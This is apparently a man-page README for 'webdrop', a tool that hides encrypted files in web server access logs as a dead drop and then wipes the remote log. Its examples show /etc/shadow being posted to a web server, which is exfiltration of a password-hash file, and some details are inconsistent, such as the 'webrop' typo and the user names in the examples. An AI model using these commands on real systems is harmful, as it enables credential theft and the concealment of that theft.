# Name

webrop - use
[CurlyTP](https://miscdotgeek.com/curlytp-every-web-server-is-a-dead-drop) to
send encrypted messages

# Synopsis

```
webdrop [OPTION] load URL [FILE ...]
webdrop [OPTION] unload [[USER@]HOST:]LOGFILE
```

# Description

Use [CurlyTP](https://miscdotgeek.com/curlytp-every-web-server-is-a-dead-drop)
to send encrypted messages.

`webdrop load` will encrypt each FILE individually and use `curl` to post it to
the webserver running on URL. `stdin` will be read if no FILEs are given or if
one of the FILEs is `-`.

`webdrop unload [[USER@]HOST:]LOGFILE` will download the webserver logfile at
HOST:LOGFILE using `scp` and then extract each FILE currently in the log. Once
all FILEs are extracted, the remote log is wiped. If only LOGFILE is given,
`webdrop` will access LOGFILE on `localhost`.

# Options

`-h` Print a help message and exit.

`-v` Display version information.

## load command

`-r [DELAY]` delay from 1 to DELAY seconds between sending successive message
chunks (Default is no delay).

`-w [WRAP]` maximum length of a message chunk (Default = 76).

## unload command

`-i [IDENTITY]` use IDENTITY as the private key to authenticate to HOST.

`-F [CONFIG]` specifies an alternative SSH configuration file.

`-p [PORT]` connect to HOST on PORT.

`-d [DIRECTORY]` save extracted files to DIRECTORY (Default = .).

`-v` display version info and exit.

`-h` display this help and exit.

# Examples

`webdrop 192.168.0.1 /etc/shadow`

Post `/etc/shadow` to the webserver at `192.168.0.1`.

`webdrop 192.168.0.1 /etc/shadow -`

Post `/etc/shadow` and whatever is read from `stdin` to the webserver at
`192.168.0.1`.

`webdrop unload admin@192.168.0.1:/var/log/nginx/access.log`

Extract messages from `/var/log/nginx/access.log` on `192.168.0.1` using
`root` to login.

`webdrop unload /var/log/nginx/access.log`

Extract messages from `/var/log/nginx/access.log` on `localhost`.

# Encryption

`webdrop` requires [mcrypt](http://mcrypt.sourceforcge.net).

# Webserver Configuration

When running `webdrop unload`, the user that accesses the webserver must be able
to read and write the server log. This will likely require changing permissions
on the file and/or adding the user to a certain group. The exact commands
necessary depend on both the webserver used and your specific requirements but
some examples are given in [webserver-setup.md](webserver-setup.md).

# See Also

[mcrypt(1)](http://mcrypt.sourceforge.net)

